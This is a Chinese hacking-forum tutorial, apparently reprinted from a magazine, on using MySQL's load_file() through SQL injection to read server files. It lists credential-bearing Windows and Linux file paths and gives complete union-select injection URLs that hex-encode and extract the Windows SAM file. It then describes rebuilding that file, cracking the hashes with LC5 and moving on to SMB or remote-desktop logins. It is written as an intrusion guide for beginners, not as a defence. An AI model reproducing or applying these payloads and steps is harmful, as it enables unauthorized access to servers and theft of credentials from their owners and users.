@@ -1,0 +1,103 @@
+D0000D发往论坛板块-------------------------------------------------------
+No2  号板块  技术文章
+D8888D贴子标题-------------------------------------------------------
+MYSQL注入中load_file()函数的进一步应用
+D8888D主贴内容-------------------------------------------------------
+作者:sai52[B.H.S.T]
+blog:[url=http://www.sai52.com]链接标记www.sai52.com[/url]
+
+文章已发表于《黑客防线》2008年第11期 转载请注明
+
+MYSQL注入中，load_file()函数在获得webshell以及提权过程中起着十分重要的作用，常被用来读取各种配置文件，如：
+/usr/local/app/apache2/conf/httpd.conf                  //apache2缺省配置文件
+/usr/local/apache2/conf/httpd.conf
+/usr/local/app/apache2/conf/extra/httpd-vhosts.conf      //虚拟网站设置
+/usr/local/app/php5/lib/php.ini                      //PHP相关设置
+/etc/sysconfig/iptables                           //从中得到防火墙规则策略
+/etc/httpd/conf/httpd.conf                        // apache配置文件
+/etc/rsyncd.conf                               //同步程序配置文件
+/etc/sysconfig/network-scripts/ifcfg-eth0          //查看IP.
+/etc/my.cnf                                 //mysql的配置文件
+/etc/redhat-release                          //系统版本
+/etc/issue
+/etc/issue.net
+c:\mysql\data\mysql\user.MYD                //存储了mysql.user表中的数据库连接密码
+c:\Program Files\RhinoSoft.com\Serv-U\ServUDaemon.ini  //存储了虚拟主机网站路径和密码
+c:\Program Files\Serv-U\ServUDaemon.ini
+c:\windows\my.ini                                 //MYSQL配置文件
+c:\windows\system32\inetsrv\MetaBase.xml            //IIS配置文件
+
+等等。实际上，load_file()的作用不止于此，它还可以用来读取系统中的二进制文件，
+
+c:\windows\repair\sam                   //存储了WINDOWS系统初次安装的密码
+c:\Program Files\ Serv-U\ServUAdmin.exe  //6.0版本以前的serv-u管理员密码存储于此
+c:\Program Files\RhinoSoft.com\ServUDaemon.exe
+C:\Documents and Settings\All Users\Application Data\Symantec\pcAnywhere\*.cif文件   //存储了pcAnywhere的登陆密码
+
+等敏感文件都在此列。
+
+MYSQL帐号权限足够高的话，理论上load_file()函数可以读取任何文件，只是因为浏览器的编码不能完全显示二进制编码的文件，从而无法把load_file()出来的二进制文件存储并加以利用。其实这个问题很容易解决，只要用hex()函数把用load_file()函数读出的二进制文件转为十六进制，就可以把二进制文件以十六进制编码的形式完全显示在网页上。把这些十六进制代码复制下来，用十六进制文件编辑器编辑后另存，就可以得到完整的二进制文件。
+
+下面用实例加以说明：
+目标服务器为win2003系统，存在root权限的注入点，有读取权限。 见图1
+[attach]955[/attach]
+load_file()读取目标服务器c:\windows\repair\sam文件。如果windows系统安装后管理员没有更改密码的话，则有希望得到目标服务器上的windows用户密码。构造
+
+[url=http://www.site.com/mulu/pf.php?id=59/]链接标记http://www.site.com/mulu/pf.php?id=59/[/url]**/and/**/1=2/**/union/**/select/**/1,2,3,4,5,6,7,replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109)),60,32),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30/*  
+
+   （注：(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109) 是c:\windows\repair\sam的ASC编码) 
+
+得到结果如图2所示，显示为乱码的sam文件。
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0904/0904300106259ede5b89688e85.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=OTU2fGUxOTkzZmRifDEyODY0ODM1MzN8NGExOVQ5ZDRjeW5NOUxOVEhjdFdLR3Zkc2lmM2srRHRkUWpjcHl4dFhhWFRmZVk%3D&nothumb=yes]链接标记下载[/url] (45.76 KB)
+
+2009-4-30 01:06
+这里要说明一下，windows系统把sam文件中的资料进行了加密处理，一般的编辑器是无法直接读取这些信息的，除了乱码什么也看不到。
+
+
+加上hex()函数后，链接为
+
+[url=http://www.site.com/mulu/pf.php?id=59/]链接标记http://www.site.com/mulu/pf.php?id=59/[/url]**/and/**/1=2/**/union/**/select/**/1,2,3,4,5,6,7,hex(replace(load_file(char(99,58,92,119,105,110,100,111,119,115,92,114,101,112,97,105,114,92,115,97,109)),60,32)),9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25,26,27,28,29,30/*
+
+得到结果为图3所示十六进制的sam文件内容。
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0904/09043001062be190fdf020c73f.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=OTU3fGIxN2Y2NWI4fDEyODY0ODM1MzN8NGExOVQ5ZDRjeW5NOUxOVEhjdFdLR3Zkc2lmM2srRHRkUWpjcHl4dFhhWFRmZVk%3D&nothumb=yes]链接标记下载[/url] (84.87 KB)
+
+2009-4-30 01:06
+复制这些十六进制代码，打开十六进制编辑器Hex Workshop，顺序点击文件--新建 (图4)
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0904/09043001062d48c6f50f00ef53.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=OTU4fDE2YmJiZWI5fDEyODY0ODM1MzN8NGExOVQ5ZDRjeW5NOUxOVEhjdFdLR3Zkc2lmM2srRHRkUWpjcHl4dFhhWFRmZVk%3D&nothumb=yes]链接标记下载[/url] (11.21 KB)
+
+2009-4-30 01:06
+点击编辑--特殊粘贴(图5)
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0904/09043001066cd0cd6c3a090fa3.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=OTU5fGNlNjg4ZmUzfDEyODY0ODM1MzN8NGExOVQ5ZDRjeW5NOUxOVEhjdFdLR3Zkc2lmM2srRHRkUWpjcHl4dFhhWFRmZVk%3D&nothumb=yes]链接标记下载[/url] (43.01 KB)
+
+2009-4-30 01:06
+选择CF_TEXT选项，并选中 解释为十六进制字串选项。(图6)
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0904/09043001065388ba7aeab3b710.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=OTYwfGE4YmYzODI4fDEyODY0ODM1MzN8NGExOVQ5ZDRjeW5NOUxOVEhjdFdLR3Zkc2lmM2srRHRkUWpjcHl4dFhhWFRmZVk%3D&nothumb=yes]链接标记下载[/url] (53.52 KB)
+
+2009-4-30 01:06
+点击粘贴，得到如图7所示画面
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0904/0904300106ecfbacb8f5e1a4de.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=OTYxfDFhZjc1NzIyfDEyODY0ODM1MzN8NGExOVQ5ZDRjeW5NOUxOVEhjdFdLR3Zkc2lmM2srRHRkUWpjcHl4dFhhWFRmZVk%3D&nothumb=yes]链接标记下载[/url] (50.83 KB)
+
+2009-4-30 01:06
+点击文件--另存为，保存类型为所有文件(图8)，就得到了完整的sam文件。
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0904/090430010631dc357565b96619.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=OTYyfGE1YTBhYzNhfDEyODY0ODM1MzN8NGExOVQ5ZDRjeW5NOUxOVEhjdFdLR3Zkc2lmM2srRHRkUWpjcHl4dFhhWFRmZVk%3D&nothumb=yes]链接标记下载[/url] (95.34 KB)
+
+2009-4-30 01:06
+之后用LC5导入得到的sam文件，(图9) 
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0904/0904300106123031c440436c6d.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=OTYzfDhkMjk1MDg5fDEyODY0ODM1MzN8NGExOVQ5ZDRjeW5NOUxOVEhjdFdLR3Zkc2lmM2srRHRkUWpjcHl4dFhhWFRmZVk%3D&nothumb=yes]链接标记下载[/url] (74.91 KB)
+
+2009-4-30 01:06
+得到密码HASH。(图10)
+[img]http://www.t00ls.net/images/default/attachimg.gif[/img]  [img]http://www.t00ls.net/attachments/month_0904/090430010678deeb67105a4cb0.jpg[/img][url=http://www.t00ls.net/attachment.php?aid=OTY0fDgyYTA3ZjhkfDEyODY0ODM1MzN8NGExOVQ5ZDRjeW5NOUxOVEhjdFdLR3Zkc2lmM2srRHRkUWpjcHl4dFhhWFRmZVk%3D&nothumb=yes]链接标记下载[/url] (57.68 KB)
+
+2009-4-30 01:06
+后续的攻击：
+如果对方开启了139/445端口，可以尝试用获得的密码HASH进行SMB攻击。
+如果对方开启了3389端口，可以尝试破解获得的密码HASH得到密码远程登陆。
+
+入侵中Load_file()的作用有其局限性，如果能配合各种目录遍历漏洞使用，往往能有奇效。
+本文没什么技术含量，只是提供了思路，希望对新手朋友们有用
+[url=http://www.t00ls.net/attachment.php?aid=OTY1fDk0YTA5Y2QzfDEyODY0ODM1MzN8NGExOVQ5ZDRjeW5NOUxOVEhjdFdLR3Zkc2lmM2srRHRkUWpjcHl4dFhhWFRmZVk%3D&nothumb=yes]链接标记10_JPG_thumb.jpg[/url] (9.33 KB) 
+下载次数:0
+2009-4-30 01:06
+
+ [img]http://www.t00ls.net/attachments/month_0904/0904300106c9e2dc3f9e5dbce0.jpg[/img]
